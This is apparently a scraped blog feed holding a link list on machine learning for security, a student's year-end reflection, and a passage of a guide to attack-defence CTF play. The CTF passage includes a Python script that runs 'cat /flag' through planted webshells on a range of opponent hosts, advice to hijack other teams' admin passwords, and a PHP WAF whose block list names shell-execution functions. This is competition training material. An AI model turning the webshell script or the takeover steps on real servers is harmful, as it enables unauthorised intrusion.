href="https://github.com/faizann24/Using-machine-learning-to-detect-malicious-URLs" target="_blank" rel="external">使用机器学习来检测恶意URL</a></li></ul><h3 id="DGA"><a href="#DGA" class="headerlink" title="DGA"></a>DGA</h3><ul><li><a href="http://galaxylab.org/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%AE%9E%E8%B7%B5-dga%E6%A3%80%E6%B5%8B/" target="_blank" rel="external">机器学习实践-DGA检测</a></li><li><a href="https://iami.xyz/DGA-Detect/" target="_blank" rel="external">使用fasttext进行DGA检测</a></li><li><a href="http://galaxylab.org/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%AE%9E%E8%B7%B5-dga%E6%A3%80%E6%B5%8B/" target="_blank" rel="external">机器学习实践-DGA检测</a></li><li><a href="http://www.iot-online.com/art/2017/071474067.html" target="_blank" rel="external">使用深度学习检测DGA</a></li><li><a href="https://www.freebuf.com/articles/es/187451.html" target="_blank" rel="external">机器学习与威胁情报的融合：一种基于AI检测恶意域名的方法</a></li><li><a href="https://github.com/surajr/URL-Classification" target="_blank" rel="external">https://github.com/surajr/URL-Classification</a></li></ul><h3 id="恶意流量检测"><a href="#恶意流量检测" class="headerlink" title="恶意流量检测"></a>恶意流量检测</h3><ul><li><a href="https://www.freebuf.com/column/170483.html" target="_blank" rel="external">利用机器学习检测HTTP恶意外连流量</a></li></ul><h3 id="恶意代码"><a href="#恶意代码" class="headerlink" title="恶意代码"></a>恶意代码</h3><ul><li><a href="https://xz.aliyun.com/t/3485" target="_blank" rel="external">使用机器学习检测混淆的命令行</a></li><li><a href="http://drops.xmd5.com/static/drops/tips-8151.html" target="_blank" rel="external">利用机器学习进行恶意代码分类</a></li><li><a href="http://drops.xmd5.com/static/drops/mobile-13428.html" target="_blank" rel="external">用机器学习检测Android恶意代码</a></li><li><a href="https://iami.xyz/AliSEC3/" target="_blank" rel="external">恶意软件与数据分析</a></li><li><a href="https://devblogs.nvidia.com/malware-detection-neural-networks/" target="_blank" rel="external">Malware Detection in Executables Using Neural Networks</a></li><li><a href="https://www.freebuf.com/articles/system/182566.html" target="_blank" rel="external">基于深度学习的恶意样本行为检测(含源码)</a></li><li><a href="https://xz.aliyun.com/t/2447" target="_blank" rel="external">深度学习在恶意软件检测中的应用</a></li><li><a href="https://xz.aliyun.com/t/2437" target="_blank" rel="external">用机器学习检测恶意PowerShell</a></li><li><a href="https://xz.aliyun.com/t/3704" target="_blank" rel="external">用机器学习进行恶意软件检测——以阿里云恶意软件检测比赛为例</a></li><li><a href="http://4o4notfound.org/index.php/archives/179/" target="_blank" rel="external">第二届微软恶意软件预测挑战赛初探</a></li></ul><h3 id="钓鱼检测"><a href="#钓鱼检测" class="headerlink" title="钓鱼检测"></a>钓鱼检测</h3><ul><li><a href="http://www.freebuf.com/sectool/142955.html" target="_blank" rel="external">IsThisLegit+Phinn：采用了机器学习算法的开源网络钓鱼防御与检测工具</a></li><li>王田峰.基于机器学习算法的钓鱼网站检测系统[D].东南大学， 2011.</li></ul><h3 id="APT检测"><a href="#APT检测" class="headerlink" title="APT检测"></a>APT检测</h3><ul><li><a href="https://mp.weixin.qq.com/s?__biz=MzU5MTM5MTQ2MA==&amp;mid=2247484139&amp;idx=1&amp;sn=0da63a49f341eccc0bb48c954d8ebbb4&amp;chksm=fe2efd60c95974767521fe6a6b7257a1d05e5482fc7ddeda281bdf0f0deb20add82d1a82d8ec&amp;mpshare=1&amp;scene=1&amp;srcid=&amp;pass_ticket=bjnNiDKomd79pQvRonW%2BXsTe6JrO%2FFs6oII12dZaLBPuQOtNK6Rzh9WSJ%2B%2F89ZUA#rd" target="_blank" rel="external">APT detection based on machine learning</a></li></ul><h3 id="业务安全检测"><a href="#业务安全检测" class="headerlink" title="业务安全检测"></a>业务安全检测</h3><ul><li><a href="https://xz.aliyun.com/t/2801" target="_blank" rel="external">基于设备指纹的风控建模以及机器学习的尝试</a></li><li><a href="https://xz.aliyun.com/t/2951" target="_blank" rel="external">如何在安全风控中评估和量化机器学习有效性</a></li><li><a href="https://www.anquanke.com/post/id/85741" target="_blank" rel="external">人工智能反欺诈三部曲——特征工程</a></li><li><a href="https://zhuanlan.zhihu.com/p/24690287" target="_blank" rel="external">阿里巴巴直播内容风险防控中的AI力量</a></li><li><a href="https://zhuanlan.zhihu.com/p/31712434" target="_blank" rel="external">人工智能反欺诈三部曲之：设备指纹</a></li></ul><h3 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h3><ul><li><a href="https://www.anquanke.com/post/id/157175" target="_blank" rel="external">机器学习在WindowsRDP版本和后门检测上的应用</a></li><li><a href="https://github.com/BoneLee/dns_tunnel_dectect_with_CNN" target="_blank" rel="external">使用CNN检测DNS隧道</a></li><li><a href="https://www.anquanke.com/post/id/163637" target="_blank" rel="external">解决机器学习和安全运营之间的最后一公里问题</a></li></ul><h2 id="AI本身安全"><a href="#AI本身安全" class="headerlink" title="AI本身安全"></a>AI本身安全</h2><h3 id="AI模型安全"><a href="#AI模型安全" class="headerlink" title="AI模型安全"></a>AI模型安全</h3><p>逃逸攻击：</p><ul><li><a href="https://www.anquanke.com/post/id/87037" target="_blank" rel="external">对深度学习的逃逸攻击 - 探究人工智能系统中的安全盲区</a></li><li><a href="http://bindog.github.io/blog/2016/11/13/game-playing-with-ml-in-security/" target="_blank" rel="external">安全领域中机器学习的对抗和博弈</a></li><li><a href="https://www.cdxy.me/?p=798" target="_blank" rel="external">基础攻防场景下的AI对抗样本初探</a></li><li><a href="https://zhuanlan.zhihu.com/p/34038758" target="_blank" rel="external">手写数字识别的攻击</a></li><li><a href="http://webber.tech/posts/%E4%BD%BF%E7%94%A8%E7%94%9F%E6%88%90%E5%AF%B9%E6%8A%97%E7%BD%91%E7%BB%9C%28GAN%29%E7%94%9F%E6%88%90DGA/" target="_blank" rel="external">使用生成对抗网络(GAN)生成DGA</a></li><li><a href="https://mp.weixin.qq.com/s/kP4YuiksI1dfZdT8Z_j_cQ" target="_blank" rel="external">从安全视角对机器学习的部分思考</a></li></ul><h3 id="AI框架安全"><a href="#AI框架安全" class="headerlink" title="AI框架安全"></a>AI框架安全</h3><ul><li><a href="https://www.anquanke.com/post/id/86989" target="_blank" rel="external">深度学习框架中的魔鬼 - 探究人工智能系统中的安全问题</a></li><li><a href="https://mp.weixin.qq.com/s/QKXd9AKkVwk3CO45-BbZSA?" target="_blank" rel="external">机器学习对抗性攻击报告</a></li></ul><h3 id="AI数据安全"><a href="#AI数据安全" class="headerlink" title="AI数据安全"></a>AI数据安全</h3><p>机器学习面临的数据污染问题。通过原理说明和代码实例，展示数据污染的特点和攻击效果。</p><ul><li><a href="https://www.anquanke.com/post/id/150653" target="_blank" rel="external">如何利用AI对抗“数据污染”和”数据中毒“？</a></li><li><a href="https://www.leiphone.com/news/201806/rYrfwtaeCNohEf0D.html" target="_blank" rel="external">对抗数据中毒–机器学习在阿里巴巴网络安全的应用</a></li><li><a href="https://manning23.github.io/2017/08/08/%E4%B8%89%E7%A7%8D%E7%89%B9%E5%BE%81%E5%90%91%E9%87%8F%E5%AF%B9%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E6%94%BB%E5%87%BB%E6%A3%80%E6%B5%8B%E7%9A%84%E5%BD%B1%E5%93%8D/" target="_blank" rel="external">三种特征向量对深度学习攻击检测的影响</a></li><li><a href="https://www.anquanke.com/post/id/144837" target="_blank" rel="external">DEFCON CHINA议题解读| 对深度学习系统的数据流攻击</a></li><li><a href="https://www.anquanke.com/post/id/95095" target="_blank" rel="external">对深度学习的降维攻击 - 人工智能系统数据流中的安全风险</a></li></ul><h3 id="AI代码安全"><a href="#AI代码安全" class="headerlink" title="AI代码安全"></a>AI代码安全</h3><p>模型代码的漏洞挖掘和利用</p><ul><li><a href="https://cloud.tencent.com/developer/article/1144154" target="_blank" rel="external">机器学习对抗性攻击</a></li></ul><h2 id="AI保护AI"><a href="#AI保护AI" class="headerlink" title="AI保护AI"></a>AI保护AI</h2><h3 id="攻击算法"><a href="#攻击算法" class="headerlink" title="攻击算法"></a>攻击算法</h3><p><a href="https://blog.csdn.net/qq_35414569/article/details/80966564" target="_blank" rel="external">DeepFool对抗算法</a></p><p>FGSM算法：机器学习对抗算法中的FGSM算法。通过算法说明和代码实例，展示FGSM算法的特点和攻击效果。</p><h3 id="对抗样本"><a href="#对抗样本" class="headerlink" title="对抗样本"></a>对抗样本</h3><ul><li><a href="https://mp.weixin.qq.com/s/F2gBP23LCEF72QDlugbBZQ" target="_blank" rel="external">详解如何使用Keras实现Wassertein GAN</a></li></ul><h2 id="杂项-1"><a href="#杂项-1" class="headerlink" title="杂项"></a>杂项</h2><ul><li><a href="https://segmentfault.com/a/1190000016981979" target="_blank" rel="external">网络安全与机器学习（一）：网络安全中的机器学习算法</a></li><li><a href="https://segmentfault.com/a/1190000016982928" target="_blank" rel="external">网络安全与机器学习（二）：网络安全任务如何结合机器学习？</a></li><li><a href="https://cloud.tencent.com/developer/article/1045024" target="_blank" rel="external">机器学习在安全攻防场景的应用与分析</a></li><li><a href="https://manning23.github.io/2016/04/06/%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90%E4%B8%8E%E5%AE%89%E5%85%A8%E5%9C%BA%E6%99%AF%E5%88%86%E6%9E%90/" target="_blank" rel="external">逻辑回归算法分析与安全场景分析</a></li><li><a href="https://www.anquanke.com/post/id/163637" target="_blank" rel="external">解决机器学习和安全运营之间的最后一公里问题</a></li><li><a href="http://ai.51cto.com/art/201811/587025.htm" target="_blank" rel="external">一文全面解读网络安全中的机器学习</a></li></ul><h2 id="优秀Github推荐"><a href="#优秀Github推荐" class="headerlink" title="优秀Github推荐"></a>优秀Github推荐</h2><p><a href="https://github.com/jivoi/awesome-ml-for-cybersecurity/blob/master/README_ch.md" target="_blank" rel="external">网络安全中机器学习大合集</a></p><p><a href="http://www.covert.io/the-definitive-security-datascience-and-machinelearning-guide/" target="_blank" rel="external">最终安全数据科学和机器学习指南</a></p><p><a href="https://github.com/wtsxDev/Machine-Learning-for-Cyber-Security#-datasets" target="_blank" rel="external">Machine Learning for Cyber Security</a></p><p><a href="https://github.com/404notf0und/AI-for-Security-Learning" target="_blank" rel="external">404师傅的整理</a></p><p><a href="https://github.com/RandomAdversary/Awesome-AI-Security" target="_blank" rel="external">Awesome-AI-Security</a></p><p><a href="https://github.com/mylamour/machine-learning-for-security" target="_blank" rel="external">iami师傅的整理</a></p><p><a href="https://github.com/13o-bbr-bbq/machine_learning_security" target="_blank" rel="external">关于机器学习和安全的源代码</a></p><p><a href="https://github.com/hongriSec/AI-Machine-Learning-Security" target="_blank" rel="external">红日安全</a></p><h2 id="优秀博客"><a href="#优秀博客" class="headerlink" title="优秀博客"></a>优秀博客</h2><p><a href="http://webber.tech/" target="_blank" rel="external">http://webber.tech/</a></p><p><a href="http://bindog.github.io/" target="_blank" rel="external">http://bindog.github.io</a></p><p><a href="https://www.cdxy.me/" target="_blank" rel="external">https://www.cdxy.me</a></p><p><a href="https://iami.xyz/" target="_blank" rel="external">https://iami.xyz</a></p><p><a href="https://www.zuozuovera.com/" target="_blank" rel="external">https://www.zuozuovera.com/</a></p><p><a href="https://home.cnblogs.com/u/LittleHann/" target="_blank" rel="external">LittleHann师傅</a></p><h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><p><a href="https://mp.weixin.qq.com/s?__biz=MzAxMjE4MTQ2OA==&amp;mid=2652730162&amp;idx=1&amp;sn=8c21d7b37036fa01ad668fe0a00e4b58&amp;chksm=805c1981b72b90977b7c60f5800f2ba8e5d2f541a12aa1a8e183b5d0c1d82e923f67bee4e557&amp;scene=21#wechat_redirect" target="_blank" rel="external">入行 AI，如何选个脚踏实地的岗位</a></p><p><a href="https://segmentfault.com/a/1190000008906097" target="_blank" rel="external">为什么机器学习在安全、风控领域频频遇冷?</a></p><h1 id="学习机器学习"><a href="#学习机器学习" class="headerlink" title="学习机器学习"></a>学习机器学习</h1><h2 id="第一步：学习编程"><a href="#第一步：学习编程" class="headerlink" title="第一步：学习编程"></a>第一步：学习编程</h2><p>实话说，计算机体系很大，除了语言、数据机构、算法之外，计算机体系结构、操作系统、网络、数据库等等领域庞大。但不管怎样，学习如何编写代码、如何编程是必备的。如何学习编程呢？学完数据结构、算法等知识后，如何提高编程能力呢？上LeetCode刷题成为很多人的不二之选。<br>推荐教程：python廖雪峰</p><h2 id="第二步：扎实数学"><a href="#第二步：扎实数学" class="headerlink" title="第二步：扎实数学"></a>第二步：扎实数学</h2><p>数学是搞数据科学的必备基础，数学不扎实，机器学习里很多原理、推导、公式便无法理解透彻，比如单单一个SVM就涉及到求导、凸优化等数学知识。所以如果数学忘了，很有必要复习并重新扎实数学基础。<br>涵盖内容：微积分、数理统计与概率论、矩阵、凸优化<br>推荐书籍：数理统计学简史、矩阵分析与应用by张贤达、凸优化(Convex Optimization)<br>推荐课程：<a href="https://mp.weixin.qq.com/s?__biz=Mzg5NzAxMDgwNg==&amp;mid=2247483685&amp;idx=1&amp;sn=1cc418d56344a222a0b6c9a56bdc5026&amp;chksm=c0791c3cf70e952ada01da3a790baa6325c2656a554566716ad96b83c7d1868770514aca8409&amp;scene=21#wechat_redirect" target="_blank" rel="external">机器学习中的数学</a></p><p><a href="http://mp.weixin.qq.com/s?__biz=Mzg5NzAxMDgwNg==&amp;mid=2247483911&amp;idx=1&amp;sn=0aa891449692d85382a9b2b5016728bb&amp;chksm=c0791f1ef70e960822c7b67b4216f6c7dc55b2c0f3f75ec7527523daea9ad25b3f86b94d5bec&amp;scene=21#wechat_redirect" target="_blank" rel="external">李航《统计学习方法》</a></p><h2 id="第三步：掌握适合数据科学的Python"><a href="#第三步：掌握适合数据科学的Python" class="headerlink" title="第三步：掌握适合数据科学的Python"></a>第三步：掌握适合数据科学的Python</h2><p>python在当今的数据分析很热，广泛应用于金融、电商等领域的大数据分析，也非常适合数据工作者利用它处理数据，所以Python在数据领域应用越来越广泛。<br>推荐教程：《利用python进行数据分析》、《Python爬虫》</p><p><a href="https://bookdata.readthedocs.io/en/latest/index.html" target="_blank" rel="external">Python 和数据科学</a></p><h2 id="第四步：开始学习机器学习"><a href="#第四步：开始学习机器学习" class="headerlink" title="第四步：开始学习机器学习"></a>第四步：开始学习机器学习</h2><p>机器学习技术在很多领域应用广泛，包括在数据挖掘、搜索、推荐、广告、自然语言处理等等中。所以学好机器学习，是搞更多应用领域的前提条件。此外，学习机器学习，不单单只是学习一个个模型、算法就足够，因为实际的机器学习工作中，分析问题、处理数据、处理特征占绝大部分工作。所以不要以为看到一个课程涵盖许许多多的模型/算法就以为捡到了宝，看一个ML课程有没有工业实战，最快判断的标准之一是看它讲不讲以及是否能讲好特征工程、模型调优。<br>推荐书籍：PRML<br>推荐课程：吴恩达《机器学习》公开课</p><p>原课程地址：coursera.org/course/ml</p><h2 id="第五步：再进一步之学习DL"><a href="#第五步：再进一步之学习DL" class="headerlink" title="第五步：再进一步之学习DL"></a>第五步：再进一步之学习DL</h2><p>得益于计算机越发强大的计算能力，神经网络的加强版深度学习（权且容许我这么不专业的叫法）越发火热，从AlphaGo、无人驾驶再到最近的AlphaGo 2.0横扫中日韩顶级骑手，AI可谓出尽了风头，在这个人工智能与大数据的时代，不学点AI，都不好意思出门跟人打招呼说我是搞计算机技术的了。<br>推荐课程：吴恩达《深度学习》公开课</p><p>原课程地址：www.deeplearning.ai</p><h2 id="第六步：做实验及上kaggle实战"><a href="#第六步：做实验及上kaggle实战" class="headerlink" title="第六步：做实验及上kaggle实战"></a>第六步：做实验及上kaggle实战</h2><p>纸上得来终觉浅、绝知此事要躬行。理论学习再多最终还是要实战。为降低门槛起见，你可以从做一个一个有趣的深度学习实验开始，比如学梵高作画、自动玩flappy bird等等。然后，在kaggle上多刷刷一些数据竞赛项目</p><h2 id="第七步：实习或工作"><a href="#第七步：实习或工作" class="headerlink" title="第七步：实习或工作"></a>第七步：实习或工作</h2><p>如果你是想做数据挖掘、计算机视觉、自然语言处理，可以继续学相关的课程。此外，很多经典最新论文值得一读。如果足够了，那就正式出山到实际江湖上闯一闯吧：找份工作，干一把！<br>推荐公司：有资源、有数据的偏大一点的公司  </p><h2 id="推荐文章"><a href="#推荐文章" class="headerlink" title="推荐文章"></a>推荐文章</h2><ul><li><p><a href="https://github.com/ZuzooVn/machine-learning-for-software-engineers/blob/master/README-zh-CN.md" target="_blank" rel="external">软件工程师的机器学习</a></p></li><li><p><a href="https://mp.weixin.qq.com/s?srcid=1225hekEwhcnq3PVwpGoV7wq&amp;scene=23&amp;mid=2247484000&amp;sn=92f198b840073e79e1a267d15a48a279&amp;idx=1&amp;__biz=Mzg5NzAxMDgwNg%3D%3D&amp;chksm=c0791f79f70e966fccd525bc2ecb11d328a12f566ccdc781132ffeeb41c484c1f7757db03911&amp;mpshare=1" target="_blank" rel="external">吴海广的建议</a></p></li><li><p>红色石头：</p><p>  <a href="https://www.itcodemonkey.com/article/6848.html" target="_blank" rel="external">https://www.itcodemonkey.com/article/6848.html</a></p><p>  <a href="https://36kr.com/p/5109465.html" target="_blank" rel="external">https://36kr.com/p/5109465.html</a></p><p>  <a href="https://zhuanlan.zhihu.com/p/29704017" target="_blank" rel="external">https://zhuanlan.zhihu.com/p/29704017</a></p></li></ul><h2 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h2><p> <a href="https://pan.baidu.com/s/1k64FTLw1Gv87WbYqviM45Q#list/path=%2F提取密码：bs8w" target="_blank" rel="external">https://pan.baidu.com/s/1k64FTLw1Gv87WbYqviM45Q#list/path=%2F提取密码：bs8w</a></p>]]></content>
      
      
      <categories>
          
          <category> AiSecurity </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2018反思总结</title>
      <link href="/archis/f7c9beed/"/>
      <url>/archis/f7c9beed/</url>
      
        <content type="html"><![CDATA[<p>时间过得真的很快，转眼的大二没了，大三也过了一半。</p><p>其实这一次总结真不知道该说什么</p><p>这一年有很多的成长和感动吧。</p><p>“Talk is Cheap. Show me the code.”这一年明白的最重要的道理了。</p><p>这一年还是一如既往的当个脚本小子，尝试了读源码去审计，一开始也头疼的要死，根本顶不住，陷入函数追踪的漩涡之中，摸搜了很久才找到自己的一点方法。</p><p>颓废也有，失望也有，努力追寻也有。</p><p>这一年算是踏入安全圈子的第二年。从大二开始懵懵懂懂学习web，学习ctf，学习基础渗透。到现在入门机器学习的大坑，内网渗透的一点大坑（实名感谢刘哥，有一个好圈子的重要吧，自己也学了不少东西）。</p><p>做安全真的是个很累的事情，不止于身体吧，还有每天拷问自己灵魂的一句，“我他妈怎么这么菜”。可是总有人要为某个行业做出点贡献，要修补随时可能出现问题的大船，保护一些梦想。</p><p>我想自己也应该要做一些值得做的，没有多少人帮助，也要硬着头皮自己上吧。也希望多接触更多人，扩大圈子学到更多别人身上的优点吧。</p><p>学任何东西最好有个奖励机制吧，能看到自己的成长，打了各个ctf比赛，发表了文章发现自己也能靠自己能力赚钱，收获水货cve、cnvd，挖了一点垃圾漏洞提交，拿到了自己想做的实习工作。就这样一直努力下去吧。</p><p>说到行业，自己暑假本要去某恒实习，无奈被鸽，暑假两个月在学校偶尔颓废，也算达成了自己要达成的目标吧。</p><p>现在也还不错，有两三个offer，寒假去实习ueba研究也请更加努力造出东西吧。希望未来自己能在安全数据分析有所造化吧。</p><p>学了一年半接触了很多，认识了很多小伙伴。感谢他们的陪伴。也感谢女朋友一直给的鼓励和支持。</p><p>接下来也请做自己喜欢的研究，不要为了某些利益而改变内心的欢喜，做自己喜欢的事才是人生一大快乐啊。</p><p>不畏将来，不忘初心吧。</p>]]></content>
      
      
      <categories>
          
          <category> 思考 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> life </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>初探线下CTF-AWD模式</title>
      <link href="/archis/49b464e6/"/>
      <url>/archis/49b464e6/</url>
      
        <content type="html"><![CDATA[<h1 id="初探线下CTF-AWD模式"><a href="#初探线下CTF-AWD模式" class="headerlink" title="初探线下CTF AWD模式"></a>初探线下CTF AWD模式</h1><p>祭上大牛的导图</p><p><img src="https://ws2.sinaimg.cn/large/006tKfTcgy1fsor5ddnfrj312f0p0q4s.jpg" alt=""></p><p><img src="https://i.loli.net/2018/07/11/5b45bb55a8a62.png" alt="naotu.png"></p><h2 id="0x00防御"><a href="#0x00防御" class="headerlink" title="0x00防御"></a>0x00防御</h2><p>先做好防御工作，否则一开始被打穿后面心态就容易崩</p><h3 id="修改密码"><a href="#修改密码" class="headerlink" title="修改密码"></a>修改密码</h3><h5 id="ssh密码修改"><a href="#ssh密码修改" class="headerlink" title="ssh密码修改"></a>ssh密码修改</h5><pre><code class="bash">sudo passwd user</code></pre><h5 id="mysql密码修改"><a href="#mysql密码修改" class="headerlink" title="mysql密码修改"></a>mysql密码修改</h5><pre><code class="mysql">mysql&gt; SET PASSWORD FOR &#39;user&#39;@&#39;localhost&#39; = PASSWORD(&#39;newpass&#39;);</code></pre><h5 id="web后台密码修改"><a href="#web后台密码修改" class="headerlink" title="web后台密码修改"></a>web后台密码修改</h5><p>Web后台很有可能存在弱口令，一般都是admin/admin,admin/123456,test/test等等，同样需要立即修改，也可以修改其他队伍的后台口令，为本队所用，说不定可以利用后台getshell，比如十分常见的wordpress。</p><p>直接在后台管理页面进行修改</p><p>当然有些情况是比赛不允许修改后台口令，会将修改后台口令视为宕机，还要被扣分</p><h5 id="修改MongoDB密码（27017端口）"><a href="#修改MongoDB密码（27017端口）" class="headerlink" title="修改MongoDB密码（27017端口）"></a>修改MongoDB密码（27017端口）</h5><h5 id="修改Redis密码（6379端口）"><a href="#修改Redis密码（6379端口）" class="headerlink" title="修改Redis密码（6379端口）"></a>修改Redis密码（6379端口）</h5><h5 id="修改网站源码中的数据库连接配置"><a href="#修改网站源码中的数据库连接配置" class="headerlink" title="修改网站源码中的数据库连接配置"></a>修改网站源码中的数据库连接配置</h5><h3 id="备份源码"><a href="#备份源码" class="headerlink" title="备份源码"></a>备份源码</h3><p>可以用Winscp、FileZilla之类的工具连接下载/var/www/html/下的文件做好备份 </p><pre><code># 打包目录tar -zcvf web.tar.gz /var/www/html 备份源码tar -zcf /tmp/name.tar.gz /path/web# 解包tar -zxvf archive_name.tar.gz</code></pre><h3 id="备份数据库"><a href="#备份数据库" class="headerlink" title="备份数据库"></a>备份数据库</h3><pre><code>备份[root@localhost ~]# cd /var/lib/mysql (进入到MySQL库目录，根据自己的MySQL的安装情况调整目录)[root@localhost mysql]# mysqldump -u 用户名 -p 数据库名&gt;导出的文件名mysqldump -u root -p 数据库名&gt;Test0809.sql，输入密码即可。# 备份指定的多个数据库mysqldump -u root -p --databases choose test &gt; /tmp/db.sql# 恢复备份，在mysql终端下执行：# 命令格式：source FILE_PATHsource ~/db.sql# 曾经遇到一个备份有问题可以执行下面mysqldump -u root --all-databases —skip-lock-tables &gt; /tmp/db.sql# 重置mysql密码# 方法1：用SET PASSWORD命令mysql&gt; set password for 用户名@localhost = password(&#39;新密码&#39;);# 方法2：用mysqladminmysqladmin -u用户名 -p旧密码 password 新密码</code></pre><h3 id="删除后门"><a href="#删除后门" class="headerlink" title="删除后门"></a>删除后门</h3><p>有些比赛主办方会在服务器预留后门，这时可以把备份目录用D盾之类的工具扫描一下，或者下载相同的cms来进行目录对比。有的话立刻删除，并且利用这个后门攻击其他服务器（很可能后门密码相同或者类似，可以猜解）</p><p>参考<a href="http://tinyfisher.github.io/security/2017/10/02/CTF" target="_blank" rel="external">表哥</a>的脚本，修改其中的地址、shell路径和密码即可</p><pre><code class="python">#coding=utf-8import requestsurl=&quot;http://192.168.71.&quot;url1=&quot;&quot;shell=&quot;/Upload/index.php&quot;passwd=&quot;abcde10db05bd4f6a24c94d7edde441d18545&quot; port=&quot;80&quot;payload = {passwd: &#39;system(\&#39;cat /flag\&#39;);&#39;}f=open(&quot;webshelllist.txt&quot;,&quot;w&quot;) f1=open(&quot;firstround_flag.txt&quot;,&quot;w&quot;)for i in [51,52,53,11,12,13,21,22,23,31,32,33,41,42,43,71,72,73,81,82,83]:     url1=url+str(i)+&quot;:&quot;+port+shell    try:        res=requests.post(url1,payload,timeout=1)        if res.status_code == requests.codes.ok:            print url1+&quot; connect shell sucess,flag is &quot;+res.text            print &gt;&gt;f1,url1+&quot; connect shell sucess,flag is &quot;+res.text            print &gt;&gt;f,url1+&quot;,&quot;+passwd        else:            print &quot;shell 404&quot;    except:        print url1+&quot; connect shell fail&quot;f.close()f1.close()</code></pre><h3 id="部署waf"><a href="#部署waf" class="headerlink" title="部署waf"></a>部署waf</h3><p>一般SQL注入之类的漏洞不会有过滤，可以部署waf来拖延对方时间。同理，可以在对方部署waf前利用sqlmap来跑</p><p>上传漏洞也是简单的黑名单过滤，但是可以通过部署waf来删除常规木马，拖延对方的时间</p><p>waf可以用安全狗linux版或者柠檬师傅发的:</p><pre><code class="php">&lt;?php$WAF_log = &#39;/var/tmp/web_log_&#39;;$Upload_dir = &#39;/var/tmp/upload/&#39;;error_reporting(0);function waf() {    global $Upload_dir;    if (!function_exists(&#39;getallheaders&#39;)) {        function getallheaders() {            foreach ($_SERVER as $name =&gt; $value) {                if (substr($name, 0, 5) == &#39;HTTP_&#39;) {                    $headers[str_replace(&#39; &#39;, &#39;-&#39;, ucwords(strtolower(str_replace(&#39;_&#39;, &#39; &#39;, substr($name, 5)))))] = $value;                }            }            unset($header[&#39;Accept&#39;]);            return $headers;        }    }    $get = $_GET;    $get2 = $_SERVER[&#39;QUERY_STRING&#39;];    $post = $_POST;    $post2 = @file_get_contents(&#39;php://input&#39;);    $cookie = $_COOKIE;    $header = getallheaders();    $header[&#39;url&#39;] = $_SERVER[&#39;REQUEST_METHOD&#39;] . &#39; &#39; . &#39;http://&#39; . $_SERVER[&#39;SERVER_NAME&#39;] . &#39;:&#39; . $_SERVER[&quot;SERVER_PORT&quot;] . $_SERVER[&quot;REQUEST_URI&quot;];    $files = $_FILES;    $ip = $_SERVER[&quot;REMOTE_ADDR&quot;];    $method = $_SERVER[&#39;REQUEST_METHOD&#39;];    $filepath = $_SERVER[&quot;SCRIPT_NAME&quot;];    if (!empty($files)) {        foreach ($_FILES as $key =&gt; $value) {            $files[$key][&#39;content&#39;] = file_get_contents($_FILES[$key][&#39;tmp_name&#39;]);            move_uploaded_file($_FILES[$key][&#39;tmp_name&#39;], $Upload_dir . $_FILES[$key][&quot;name&quot;] . &#39;.&#39; . time());            file_put_contents($_FILES[$key][&#39;tmp_name&#39;], &quot;lemon&quot;);        }    }    unset($header[&#39;Accept&#39;]);    $input = array(&quot;Header&quot; =&gt; $header, &quot;Get&quot; =&gt; $get, &quot;Get2&quot; =&gt; $get2, &quot;Cookie&quot; =&gt; $cookie, &quot;Post&quot; =&gt; $post, &quot;Post2&quot; =&gt; $post2, &quot;File&quot; =&gt; $files);    logging($input);    $pattern = &quot;/select|insert|update|delete|and|or|\&#39;|\/\*|\*|\.\.\/|\.\/|union|into|load_file|outfile|dumpfile|sub|hex&quot;;    $pattern .= &quot;|file_put_contents|fwrite|curl|system|eval|assert|file_get_contents&quot;;    $pattern .= &quot;|passthru|exec|system|chroot|scandir|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore&quot;;    $pattern .= &quot;|`|dl|openlog|syslog|readlink|symlink|popepassthru|stream_socket_server|assert|pcntl_exec/i&quot;;}function logging($var) {    global $WAF_log;    $tmp = &quot;\n[&quot; . date(&#39;y-m-d H:i:s&#39;) . &quot;]\n&quot;;    foreach ($var as $k =&gt; $v) {        if (!empty($v)) {            $tmp .= $k . &quot; : &quot; . print_r($v, true);        }    }    file_put_contents($WAF_log . date(&#39;H&#39;, time()), $tmp . &quot;\n\r&quot;, FILE_APPEND);}waf();?&gt;</code></pre><p>在PHP文件里include这个waf即可，要比<a href="http://www.safedog.cn/install_desc_website.html" target="_blank" rel="external">安全狗</a>麻烦点</p><pre><code>安装安全狗https://zhuanlan.zhihu.com/p/25364552</code></pre><p>使用方法：</p><p>(1).将waf.php传到要包含的文档的目录</p><p>(2).在页面中加入防护，有两种做法，根据情况二选一即可：</p><p>a).在所需要防护的页面加入代码</p><pre><code>require_once(&#39;./datawaf.php&#39;);</code></pre><p>就可以做到页面防注入、跨站</p><p>如果想整站防注，就在网站的一个公用文档中，如数据库链接文档config.inc.php中！</p><p>添加require_once(‘waf.php’);来调用本代码</p><p>常用php系统添加文档</p><pre><code>PHPCMS V9 \phpcms\base.phpPHPWIND8.7 \data\sql_config.phpDEDECMS5.7 \data\common.inc.phpDiscuzX2   \config\config_global.phpWordpress   \wp-config.phpMetinfo   \include\head.php</code></pre><p>b).在每个文档最前加上代码</p><p>在php.ini中找到:</p><pre><code>Automatically add files before or after any PHP document.auto_prepend_file = 360_safe3.php路径;</code></pre><h5 id="有root权限"><a href="#有root权限" class="headerlink" title="有root权限"></a>有root权限</h5><p>那麽，这样就简单了，直接写在配置中。</p><p>vim php.ini</p><p>auto_append_file = “/dir/path/phpwaf.php”</p><p>重启Apache或者php-fpm就能生效了。</p><p>当然也可以写在 .user.ini 或者 .htaccess 中。</p><p>php_value auto_prepend_file “/dir/path/phpwaf.php”</p><h5 id="只有user权限"><a href="#只有user权限" class="headerlink" 